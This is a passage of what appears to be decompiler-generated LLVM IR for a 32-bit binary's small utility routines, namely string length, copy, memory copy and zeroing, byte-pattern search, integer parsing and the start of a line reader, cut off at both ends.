  ret i32 %v3_8050fb7

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8050fd0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050fd0, i32* @edx, align 4
  %v2_8050fd6 = load i8, i8* %arg1, align 1
  %v3_8050fd6 = icmp eq i8 %v2_8050fd6, 0
  br i1 %v3_8050fd6, label %dec_label_pc_8050fe7, label %dec_label_pc_8050fe0

dec_label_pc_8050fe0:                             ; preds = %entry, %dec_label_pc_8050fe0
  %v0_8050fe0 = phi i32 [ %v1_8050fe0, %dec_label_pc_8050fe0 ], [ 0, %entry ]
  %v1_8050fe0 = add i32 %v0_8050fe0, 1
  %v2_8050fe1 = add i32 %v1_8050fe0, %v4_8050fd0
  %v3_8050fe1 = inttoptr i32 %v2_8050fe1 to i8*
  %v4_8050fe1 = load i8, i8* %v3_8050fe1, align 1
  %v5_8050fe1 = icmp eq i8 %v4_8050fe1, 0
  %v1_8050fe5 = icmp eq i1 %v5_8050fe1, false
  br i1 %v1_8050fe5, label %dec_label_pc_8050fe0, label %dec_label_pc_8050fe7

dec_label_pc_8050fe7:                             ; preds = %dec_label_pc_8050fe0, %entry
  %v0_8050fe7 = phi i32 [ 0, %entry ], [ %v1_8050fe0, %dec_label_pc_8050fe0 ]
  ret i32 %v0_8050fe7

; uselistorder directives
  uselistorder label %dec_label_pc_8050fe0, { 1, 0 }
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050ff1 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ff1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v4_8050ff8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050ff8, i32* %ebx.global-to-local, align 4
  %v1_8050ffc = inttoptr i32 %arg2 to i8*
  %v2_8050ffc = load i8, i8* %v1_8050ffc, align 1
  %v3_8050ffc = zext i8 %v2_8050ffc to i32
  %v4_8050ffc = load i32, i32* @eax, align 4
  %v5_8050ffc = and i32 %v4_8050ffc, -256
  %v6_8050ffc = or i32 %v5_8050ffc, %v3_8050ffc
  store i32 %v6_8050ffc, i32* %eax.global-to-local, align 4
  %v4_8050ffe = icmp eq i8 %v2_8050ffc, 0
  br i1 %v4_8050ffe, label %dec_label_pc_8051009, label %dec_label_pc_8051002

dec_label_pc_8051002:                             ; preds = %entry, %dec_label_pc_8051002
  %v0_8051002 = phi i32 [ %v1_8051002, %dec_label_pc_8051002 ], [ 0, %entry ]
  %v1_8051002 = add i32 %v0_8051002, 1
  store i32 %v1_8051002, i32* %esi.global-to-local, align 4
  %v2_8051003 = add i32 %v1_8051002, %arg2
  %v3_8051003 = inttoptr i32 %v2_8051003 to i8*
  %v4_8051003 = load i8, i8* %v3_8051003, align 1
  %v5_8051003 = icmp eq i8 %v4_8051003, 0
  %v1_8051007 = icmp eq i1 %v5_8051003, false
  br i1 %v1_8051007, label %dec_label_pc_8051002, label %dec_label_pc_8051009

dec_label_pc_8051009:                             ; preds = %dec_label_pc_8051002, %entry
  %v0_805100b = phi i32 [ -1, %entry ], [ %v0_8051002, %dec_label_pc_8051002 ]
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v0_805100b, i32* %edx.global-to-local, align 4
  store i8 %v2_8050ffc, i8* %arg1, align 1
  %v0_805101716 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805101717 = add i32 %v0_805101716, 1
  store i32 %v1_805101717, i32* %ebx.global-to-local, align 4
  %v10_805101819 = icmp eq i32 %v0_805100b, -1
  %v1_805101b20 = icmp eq i1 %v10_805101819, false
  br i1 %v1_805101b20, label %dec_label_pc_8051010, label %dec_label_pc_805101d

dec_label_pc_8051010:                             ; preds = %dec_label_pc_8051009, %dec_label_pc_8051010
  %v0_805101822 = phi i32 [ %v0_8051018, %dec_label_pc_8051010 ], [ %v0_805100b, %dec_label_pc_8051009 ]
  %v1_805101721 = phi i32 [ %v1_8051017, %dec_label_pc_8051010 ], [ %v1_805101717, %dec_label_pc_8051009 ]
  %v0_8051010 = load i32, i32* @ecx, align 4
  %v1_8051010 = add i32 %v0_8051010, 1
  %v2_8051010 = inttoptr i32 %v1_8051010 to i8*
  %v3_8051010 = load i8, i8* %v2_8051010, align 1
  %v4_8051010 = zext i8 %v3_8051010 to i32
  %v5_8051010 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051010 = and i32 %v5_8051010, -256
  %v7_8051010 = or i32 %v6_8051010, %v4_8051010
  store i32 %v7_8051010, i32* %eax.global-to-local, align 4
  store i32 %v1_8051010, i32* @ecx, align 4
  %v1_8051014 = add i32 %v0_805101822, -1
  store i32 %v1_8051014, i32* %edx.global-to-local, align 4
  %v3_8051015 = inttoptr i32 %v1_805101721 to i8*
  store i8 %v3_8051010, i8* %v3_8051015, align 1
  %v0_8051017 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051017 = add i32 %v0_8051017, 1
  store i32 %v1_8051017, i32* %ebx.global-to-local, align 4
  %v0_8051018 = load i32, i32* %edx.global-to-local, align 4
  %v10_8051018 = icmp eq i32 %v0_8051018, -1
  %v1_805101b = icmp eq i1 %v10_8051018, false
  br i1 %v1_805101b, label %dec_label_pc_8051010, label %dec_label_pc_8051014.dec_label_pc_805101d_crit_edge

dec_label_pc_8051014.dec_label_pc_805101d_crit_edge: ; preds = %dec_label_pc_8051010
  %v2_805101f.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805101d

dec_label_pc_805101d:                             ; preds = %dec_label_pc_8051014.dec_label_pc_805101d_crit_edge, %dec_label_pc_8051009
  %v2_805101f = phi i32 [ %v2_805101f.pre, %dec_label_pc_8051014.dec_label_pc_805101d_crit_edge ], [ %v0_8050ff1, %dec_label_pc_8051009 ]
  %v0_805101d = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805101d, i32* %eax.global-to-local, align 4
  store i32 %v2_805101f, i32* @ebx, align 4
  ret i32 %v0_805101d

; uselistorder directives
  uselistorder i32 %v0_8051018, { 1, 0 }
  uselistorder i32 %v1_8051017, { 1, 0 }
  uselistorder i32 %v0_805100b, { 1, 0, 2 }
  uselistorder i32 %v1_8051002, { 0, 2, 1 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051010, { 1, 0 }
  uselistorder label %dec_label_pc_8051002, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051031 = load i32, i32* @ebx, align 4
  store i32 %v0_8051031, i32* %stack_var_-8, align 4
  store i32 %arg3, i32* @ecx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_805103e = icmp eq i32 %arg3, 0
  br i1 %v1_805103e, label %dec_label_pc_805104f, label %dec_label_pc_8051042

dec_label_pc_8051042:                             ; preds = %entry
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_805104411 = inttoptr i32 %arg2 to i8*
  %v4_805104412 = load i8, i8* %v3_805104411, align 1
  %v6_805104714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_805104412, i8* %v6_805104714, align 1
  %v0_805104a15 = load i32, i32* %edx.global-to-local, align 4
  %v1_805104a16 = add i32 %v0_805104a15, 1
  store i32 %v1_805104a16, i32* @edx, align 4
  %v12_805104b17 = icmp eq i32 %v1_805104a16, %arg3
  %v1_805104d18 = icmp eq i1 %v12_805104b17, false
  br i1 %v1_805104d18, label %dec_label_pc_8051044.dec_label_pc_8051044_crit_edge, label %dec_label_pc_805104f.loopexit

dec_label_pc_8051044.dec_label_pc_8051044_crit_edge: ; preds = %dec_label_pc_8051042, %dec_label_pc_8051044.dec_label_pc_8051044_crit_edge
  %v1_805104a20 = phi i32 [ %v1_805104a, %dec_label_pc_8051044.dec_label_pc_8051044_crit_edge ], [ %v1_805104a16, %dec_label_pc_8051042 ]
  %v1_8051044.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051047.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051044 = add i32 %v1_805104a20, %v1_8051044.pre
  %v3_8051044 = inttoptr i32 %v2_8051044 to i8*
  %v4_8051044 = load i8, i8* %v3_8051044, align 1
  %v5_8051047 = add i32 %v1_805104a20, %v4_8051047.pre
  %v6_8051047 = inttoptr i32 %v5_8051047 to i8*
  store i8 %v4_8051044, i8* %v6_8051047, align 1
  %v0_805104a = load i32, i32* @edx, align 4
  %v1_805104a = add i32 %v0_805104a, 1
  store i32 %v1_805104a, i32* @edx, align 4
  %v12_805104b = icmp eq i32 %v1_805104a, %arg3
  %v1_805104d = icmp eq i1 %v12_805104b, false
  br i1 %v1_805104d, label %dec_label_pc_8051044.dec_label_pc_8051044_crit_edge, label %dec_label_pc_805104f.loopexit

dec_label_pc_805104f.loopexit:                    ; preds = %dec_label_pc_8051044.dec_label_pc_8051044_crit_edge, %dec_label_pc_8051042
  %v4_8051044.lcssa = phi i8 [ %v4_805104412, %dec_label_pc_8051042 ], [ %v4_8051044, %dec_label_pc_8051044.dec_label_pc_8051044_crit_edge ]
  %phitmp = sext i8 %v4_8051044.lcssa to i32
  %v2_805104f.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805104f

dec_label_pc_805104f:                             ; preds = %dec_label_pc_805104f.loopexit, %entry
  %v2_805104f = phi i32 [ %v0_8051031, %entry ], [ %v2_805104f.pre, %dec_label_pc_805104f.loopexit ]
  %.1 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_805104f.loopexit ]
  store i32 %v2_805104f, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_805104a, { 1, 2, 0 }
  uselistorder i32 %v1_805104a20, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8051044.dec_label_pc_8051044_crit_edge, { 1, 0 }
}

define i32 @util_zero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8051068 = icmp eq i32 %arg2, 0
  br i1 %v1_8051068, label %entry.dec_label_pc_8051079_crit_edge, label %dec_label_pc_805106c

entry.dec_label_pc_8051079_crit_edge:             ; preds = %entry
  %v0_8051079.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051079

dec_label_pc_805106c:                             ; preds = %entry
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80510705 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_80510705, align 1
  %v0_80510746 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510747 = add i32 %v0_80510746, 1
  store i32 %v1_80510747, i32* %eax.global-to-local, align 4
  %v12_80510758 = icmp eq i32 %v1_80510747, %arg2
  %v1_80510779 = icmp eq i1 %v12_80510758, false
  br i1 %v1_80510779, label %dec_label_pc_8051070.dec_label_pc_8051070_crit_edge, label %dec_label_pc_8051079

dec_label_pc_8051070.dec_label_pc_8051070_crit_edge: ; preds = %dec_label_pc_805106c, %dec_label_pc_8051070.dec_label_pc_8051070_crit_edge
  %v1_805107410 = phi i32 [ %v1_8051074, %dec_label_pc_8051070.dec_label_pc_8051070_crit_edge ], [ %v1_80510747, %dec_label_pc_805106c ]
  %v1_8051070.pre = load i32, i32* @ecx, align 4
  %v2_8051070 = add i32 %v1_805107410, %v1_8051070.pre
  %v3_8051070 = inttoptr i32 %v2_8051070 to i8*
  store i8 0, i8* %v3_8051070, align 1
  %v0_8051074 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051074 = add i32 %v0_8051074, 1
  store i32 %v1_8051074, i32* %eax.global-to-local, align 4
  %v12_8051075 = icmp eq i32 %v1_8051074, %arg2
  %v1_8051077 = icmp eq i1 %v12_8051075, false
  br i1 %v1_8051077, label %dec_label_pc_8051070.dec_label_pc_8051070_crit_edge, label %dec_label_pc_8051079

dec_label_pc_8051079:                             ; preds = %dec_label_pc_805106c, %dec_label_pc_8051070.dec_label_pc_8051070_crit_edge, %entry.dec_label_pc_8051079_crit_edge
  %v0_8051079 = phi i32 [ %v0_8051079.pre, %entry.dec_label_pc_8051079_crit_edge ], [ %v1_80510747, %dec_label_pc_805106c ], [ %v1_8051074, %dec_label_pc_8051070.dec_label_pc_8051070_crit_edge ]
  ret i32 %v0_8051079

; uselistorder directives
  uselistorder i32 %v1_8051074, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051079, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051070.dec_label_pc_8051070_crit_edge, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_8051089 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_8051089, label %dec_label_pc_805108b, label %dec_label_pc_8051090

dec_label_pc_805108b:                             ; preds = %dec_label_pc_80510a2, %entry, %dec_label_pc_8051090
  ret i32 -1

dec_label_pc_8051090:                             ; preds = %entry
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_805108b, label %dec_label_pc_8051094

dec_label_pc_8051094:                             ; preds = %dec_label_pc_8051090
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_80510a9

dec_label_pc_80510a0:                             ; preds = %dec_label_pc_80510a9
  store i32 0, i32* @ecx, align 4
  br label %dec_label_pc_80510a2

dec_label_pc_80510a2:                             ; preds = %dec_label_pc_80510b9, %dec_label_pc_80510a0
  %v3_80510b44 = phi i32 [ %v1_80510b9, %dec_label_pc_80510b9 ], [ 0, %dec_label_pc_80510a0 ]
  %v1_80510a2 = add i32 %v0_80510a2, 1
  store i32 %v1_80510a2, i32* @edx, align 4
  %v15_80510a3 = icmp eq i32 %v1_80510a2, %arg2
  br i1 %v15_80510a3, label %dec_label_pc_805108b, label %dec_label_pc_80510a9

dec_label_pc_80510a9:                             ; preds = %dec_label_pc_80510a2, %dec_label_pc_8051094
  %v0_80510b9 = phi i32 [ %v3_80510b44, %dec_label_pc_80510a2 ], [ 0, %dec_label_pc_8051094 ]
  %v6_80510ad = phi i32 [ %v8_80510ad, %dec_label_pc_80510a2 ], [ %arg2, %dec_label_pc_8051094 ]
  %v0_80510a2 = phi i32 [ %v1_80510a2, %dec_label_pc_80510a2 ], [ 0, %dec_label_pc_8051094 ]
  %v2_80510ad = add i32 %v0_80510a2, %arg1
  %v3_80510ad = inttoptr i32 %v2_80510ad to i8*
  %v4_80510ad = load i8, i8* %v3_80510ad, align 1
  %v5_80510ad = zext i8 %v4_80510ad to i32
  %v7_80510ad = and i32 %v6_80510ad, -256
  %v8_80510ad = or i32 %v5_80510ad, %v7_80510ad
  %v4_80510b4 = add i32 %v0_80510b9, %arg3
  %v5_80510b4 = inttoptr i32 %v4_80510b4 to i8*
  %v6_80510b4 = load i8, i8* %v5_80510b4, align 1
  %v17_80510b4 = icmp eq i8 %v4_80510ad, %v6_80510b4
  %v1_80510b7 = icmp eq i1 %v17_80510b4, false
  br i1 %v1_80510b7, label %dec_label_pc_80510a0, label %dec_label_pc_80510b9

dec_label_pc_80510b9:                             ; preds = %dec_label_pc_80510a9
  %v1_80510b9 = add i32 %v0_80510b9, 1
  store i32 %v1_80510b9, i32* @ecx, align 4
  %v15_80510ba = icmp eq i32 %v1_80510b9, %arg4
  %v1_80510be = icmp eq i1 %v15_80510ba, false
  br i1 %v1_80510be, label %dec_label_pc_80510a2, label %dec_label_pc_80510c0

dec_label_pc_80510c0:                             ; preds = %dec_label_pc_80510b9
  %v1_80510c0 = add i32 %v0_80510a2, 1
  ret i32 %v1_80510c0

; uselistorder directives
  uselistorder i32 %v1_80510b9, { 0, 2, 1 }
  uselistorder i32 %v0_80510b9, { 1, 0 }
  uselistorder i32 %v1_80510a2, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805108b, { 0, 2, 1 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80510d7 = ptrtoint i8* %arg1 to i32
  %v4_80510e0.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80510e0

dec_label_pc_80510e0:                             ; preds = %dec_label_pc_80510ee, %dec_label_pc_80510ea, %dec_label_pc_80510e0, %entry
  %v4_80510e0 = phi i32 [ %v4_80510e0.pre, %entry ], [ %v6_80510e0, %dec_label_pc_80510e0 ], [ %v6_80510e0, %dec_label_pc_80510ea ], [ %v6_80510e0, %dec_label_pc_80510ee ]
  %v0_80510e2 = phi i32 [ %v4_80510d7, %entry ], [ %v1_80510e2, %dec_label_pc_80510e0 ], [ %v1_80510e2, %dec_label_pc_80510ea ], [ %v1_80510e2, %dec_label_pc_80510ee ]
  %v1_80510e0 = inttoptr i32 %v0_80510e2 to i8*
  %v2_80510e0 = load i8, i8* %v1_80510e0, align 1
  %v3_80510e0 = zext i8 %v2_80510e0 to i32
  %v5_80510e0 = and i32 %v4_80510e0, -256
  %v6_80510e0 = or i32 %v3_80510e0, %v5_80510e0
  %v1_80510e2 = add i32 %v0_80510e2, 1
  store i32 %v1_80510e2, i32* @ecx, align 4
  %v7_80510e6 = icmp eq i8 %v2_80510e0, 32
  br i1 %v7_80510e6, label %dec_label_pc_80510e0, label %dec_label_pc_80510ea

dec_label_pc_80510ea:                             ; preds = %dec_label_pc_80510e0
  %v10_80510ea = icmp eq i8 %v2_80510e0, 9
  br i1 %v10_80510ea, label %dec_label_pc_80510e0, label %dec_label_pc_80510ee

dec_label_pc_80510ee:                             ; preds = %dec_label_pc_80510ea
  %v10_80510ee = icmp eq i8 %v2_80510e0, 10
  br i1 %v10_80510ee, label %dec_label_pc_80510e0, label %dec_label_pc_80510f2

dec_label_pc_80510f2:                             ; preds = %dec_label_pc_80510ee
  %tmp42 = sext i32 %arg2 to i64
  %v10_80510f2 = icmp eq i8 %v2_80510e0, 45
  br i1 %v10_80510f2, label %dec_label_pc_8051192, label %dec_label_pc_80510fa

dec_label_pc_80510fa:                             ; preds = %dec_label_pc_80510f2
  %v10_80510fa = icmp eq i8 %v2_80510e0, 43
  br i1 %v10_80510fa, label %dec_label_pc_80511bc, label %dec_label_pc_8051102

dec_label_pc_8051102:                             ; preds = %dec_label_pc_80510fa, %dec_label_pc_80511bc
  %v0_805114532 = phi i32 [ %v1_80510e2, %dec_label_pc_80510fa ], [ %v1_80511bf, %dec_label_pc_80511bc ]
  %v0_805114911.in = phi i8 [ %v2_80510e0, %dec_label_pc_80510fa ], [ %v2_80511bc, %dec_label_pc_80511bc ]
  br label %dec_label_pc_805110f

dec_label_pc_805110f:                             ; preds = %dec_label_pc_8051192, %dec_label_pc_8051102
  %v0_805114531 = phi i32 [ %v1_805119a, %dec_label_pc_8051192 ], [ %v0_805114532, %dec_label_pc_8051102 ]
  %v0_805114910.in = phi i8 [ %v2_8051192, %dec_label_pc_8051192 ], [ %v0_805114911.in, %dec_label_pc_8051102 ]
  %v5_8051113 = phi i64 [ 2147483648, %dec_label_pc_8051192 ], [ 2147483647, %dec_label_pc_8051102 ]
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8051192 ], [ 0, %dec_label_pc_8051102 ]
  %v12_8051113 = udiv i64 %v5_8051113, %tmp42
  %v13_8051113 = trunc i64 %v12_8051113 to i32
  %v14_8051113 = urem i64 %v5_8051113, %tmp42
  %v15_8051113 = trunc i64 %v14_8051113 to i32
  br label %dec_label_pc_8051149

dec_label_pc_8051122:                             ; preds = %dec_label_pc_8051149
  %v1_8051122 = add nsw i32 %v0_8051122, -48
  br label %dec_label_pc_8051125

dec_label_pc_8051125:                             ; preds = %dec_label_pc_805118c, %dec_label_pc_8051122
  %v0_8051142 = phi i32 [ %v2_805118e, %dec_label_pc_805118c ], [ %v1_8051122, %dec_label_pc_8051122 ]
  store i32 %v0_8051142, i32* @edx, align 4
  %v7_8051129 = icmp slt i32 %v0_8051142, %arg2
  br i1 %v7_8051129, label %dec_label_pc_805112b, label %dec_label_pc_8051165

dec_label_pc_805112b:                             ; preds = %dec_label_pc_8051125
  %v2_805112b = icmp slt i32 %v0_805112b, 0
  br i1 %v2_805112b, label %dec_label_pc_8051183, label %dec_label_pc_805112f

dec_label_pc_805112f:                             ; preds = %dec_label_pc_805112b
  %tmp44 = icmp ugt i32 %v0_805112f, %v13_8051113
  br i1 %tmp44, label %dec_label_pc_8051183, label %dec_label_pc_8051134

dec_label_pc_8051134:                             ; preds = %dec_label_pc_805112f
  %v14_805112f = icmp eq i32 %v0_805112f, %v13_8051113
  br i1 %v14_805112f, label %dec_label_pc_805117d, label %dec_label_pc_8051136

dec_label_pc_8051136:                             ; preds = %dec_label_pc_805117d, %dec_label_pc_8051134
  %v4_805113f = mul i32 %v1_805113f, %arg2
  %v2_8051142 = add i32 %v0_8051142, %v4_805113f
  br label %dec_label_pc_8051145

dec_label_pc_8051145:                             ; preds = %dec_label_pc_8051183, %dec_label_pc_8051136
  %v1_805113f28 = phi i32 [ %v1_805113f, %dec_label_pc_8051183 ], [ %v2_8051142, %dec_label_pc_8051136 ]
  %v0_805116d18 = phi i32 [ %v0_805112f, %dec_label_pc_8051183 ], [ %v2_8051142, %dec_label_pc_8051136 ]
  %v0_805116517 = phi i32 [ -1, %dec_label_pc_8051183 ], [ 1, %dec_label_pc_8051136 ]
  %v1_8051145 = inttoptr i32 %v0_8051145 to i8*
  %v2_8051145 = load i8, i8* %v1_8051145, align 1
  %v1_8051148 = add i32 %v0_8051145, 1
  store i32 %v1_8051148, i32* @ecx, align 4
  br label %dec_label_pc_8051149

dec_label_pc_8051149:                             ; preds = %dec_label_pc_805110f, %dec_label_pc_8051145
  %v0_8051145 = phi i32 [ %v0_805114531, %dec_label_pc_805110f ], [ %v1_8051148, %dec_label_pc_8051145 ]
  %v1_805113f = phi i32 [ 0, %dec_label_pc_805110f ], [ %v1_805113f28, %dec_label_pc_8051145 ]
  %v0_805112f = phi i32 [ 0, %dec_label_pc_805110f ], [ %v0_805116d18, %dec_label_pc_8051145 ]
  %v0_805112b = phi i32 [ 0, %dec_label_pc_805110f ], [ %v0_805116517, %dec_label_pc_8051145 ]
  %v2_8051149 = phi i32 [ %v15_8051113, %dec_label_pc_805110f ], [ %v0_8051142, %dec_label_pc_8051145 ]
  %v0_8051122.in = phi i8 [ %v0_805114910.in, %dec_label_pc_805110f ], [ %v2_8051145, %dec_label_pc_8051145 ]
  %v0_8051122 = sext i8 %v0_8051122.in to i32
  %v1_8051149 = urem i32 %v0_8051122, 256
  %v3_8051149 = and i32 %v2_8051149, -256
  %v4_8051149 = or i32 %v1_8051149, %v3_8051149
  store i32 %v4_8051149, i32* @edx, align 4
  %v1_805114b = add nuw nsw i32 %v1_8051149, 208
  %v1_805114e = trunc i32 %v1_805114b to i8
  %tmp45 = icmp ult i8 %v1_805114e, 10
  br i1 %tmp45, label %dec_label_pc_8051122, label %dec_label_pc_8051152

dec_label_pc_8051152:                             ; preds = %dec_label_pc_8051149
  %v1_8051152 = add nuw nsw i32 %v1_8051149, 191
  %v1_805115a = trunc i32 %v1_8051152 to i8
  %tmp46 = icmp ult i8 %v1_805115a, 26
  br i1 %tmp46, label %dec_label_pc_805118c, label %dec_label_pc_805115e

dec_label_pc_805115e:                             ; preds = %dec_label_pc_8051152
  %v1_805115e = add nuw nsw i32 %v1_8051149, 159
  %v1_8051161 = trunc i32 %v1_805115e to i8
  %tmp47 = icmp ult i8 %v1_8051161, 26
  br i1 %tmp47, label %dec_label_pc_8051188, label %dec_label_pc_8051165

dec_label_pc_8051165:                             ; preds = %dec_label_pc_8051125, %dec_label_pc_805115e
  %v2_8051165 = icmp slt i32 %v0_805112b, 0
  br i1 %v2_8051165, label %dec_label_pc_80511a8, label %dec_label_pc_8051169

dec_label_pc_8051169:                             ; preds = %dec_label_pc_8051165
  store i32 %storemerge3, i32* @edx, align 4
  %v1_805116f = icmp eq i32 %storemerge3, 0
  br i1 %v1_805116f, label %dec_label_pc_8051175, label %dec_label_pc_8051173

dec_label_pc_8051173:                             ; preds = %dec_label_pc_8051169
  %v1_8051173 = sub i32 0, %v0_805112f
  br label %dec_label_pc_8051175

dec_label_pc_8051175:                             ; preds = %dec_label_pc_8051169, %dec_label_pc_8051173
  %v0_805117c = phi i32 [ %v0_805112f, %dec_label_pc_8051169 ], [ %v1_8051173, %dec_label_pc_8051173 ]
  ret i32 %v0_805117c

dec_label_pc_805117d:                             ; preds = %dec_label_pc_8051134
  %v5_805117d = sub i32 %v0_8051142, %v15_8051113
  %v11_805117d = xor i32 %v0_8051142, %v15_8051113
  %v12_805117d = xor i32 %v5_805117d, %v0_8051142
  %v13_805117d = and i32 %v12_805117d, %v11_805117d
  %v14_805117d = icmp slt i32 %v13_805117d, 0
  %v15_805117d = icmp eq i32 %v5_805117d, 0
  %v16_805117d = icmp slt i32 %v5_805117d, 0
  %v3_8051181 = icmp ne i1 %v16_805117d, %v14_805117d
  %v4_8051181 = or i1 %v15_805117d, %v3_8051181
  br i1 %v4_8051181, label %dec_label_pc_8051136, label %dec_label_pc_8051183

dec_label_pc_8051183:                             ; preds = %dec_label_pc_805112f, %dec_label_pc_805117d, %dec_label_pc_805112b
  br label %dec_label_pc_8051145

dec_label_pc_8051188:                             ; preds = %dec_label_pc_805115e
  br label %dec_label_pc_805118c

dec_label_pc_805118c:                             ; preds = %dec_label_pc_8051152, %dec_label_pc_8051188
  %v1_805118e = phi i32 [ 55, %dec_label_pc_8051152 ], [ 87, %dec_label_pc_8051188 ]
  %v2_805118e = sub nsw i32 %v0_8051122, %v1_805118e
  br label %dec_label_pc_8051125

dec_label_pc_8051192:                             ; preds = %dec_label_pc_80510f2
  %v1_8051192 = inttoptr i32 %v1_80510e2 to i8*
  %v2_8051192 = load i8, i8* %v1_8051192, align 1
  %v1_805119a = add i32 %v0_80510e2, 2
  store i32 %v1_805119a, i32* @ecx, align 4
  br label %dec_label_pc_805110f

dec_label_pc_80511a8:                             ; preds = %dec_label_pc_8051165
  %v8_80511a8 = icmp eq i32 %storemerge3, 0
  %v2_80511ad = zext i1 %v8_80511a8 to i32
  %v1_80511b24 = or i32 %v2_80511ad, -2147483648
  ret i32 %v1_80511b24

dec_label_pc_80511bc:                             ; preds = %dec_label_pc_80510fa
  %v1_80511bc = inttoptr i32 %v1_80510e2 to i8*
  %v2_80511bc = load i8, i8* %v1_80511bc, align 1
  %v1_80511bf = add i32 %v0_80510e2, 2
  store i32 %v1_80511bf, i32* @ecx, align 4
  br label %dec_label_pc_8051102

; uselistorder directives
  uselistorder i32 %v1_80511bf, { 1, 0 }
  uselistorder i32 %v1_805119a, { 1, 0 }
  uselistorder i32 %v5_805117d, { 1, 2, 0 }
  uselistorder i32 %v0_8051122, { 0, 2, 1 }
  uselistorder i32 %v2_8051142, { 1, 0 }
  uselistorder i32 %v0_8051142, { 0, 1, 4, 3, 2, 5, 6 }
  uselistorder i32 %v15_8051113, { 0, 2, 1 }
  uselistorder i32 %v13_8051113, { 1, 0 }
  uselistorder i32 %v1_80510e2, { 5, 4, 3, 6, 2, 1, 0 }
  uselistorder i32 %v6_80510e0, { 2, 1, 0 }
  uselistorder i32 %v0_80510e2, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 5, 7, 6, 1, 8, 2, 3, 4, 9 }
  uselistorder label %dec_label_pc_805118c, { 1, 0 }
  uselistorder label %dec_label_pc_8051183, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051175, { 1, 0 }
  uselistorder label %dec_label_pc_8051165, { 1, 0 }
  uselistorder label %dec_label_pc_8051149, { 1, 0 }
  uselistorder label %dec_label_pc_8051102, { 1, 0 }
}

define i32 @util_fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* %edi.global-to-local, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_80511ed23 = call i32 @__libc_read(i32 %arg3, i32 %arg1, i32 1)
  %v8_80511f525 = icmp eq i32 %v3_80511ed23, 1
  %v1_80511f626 = icmp eq i1 %v8_80511f525, false
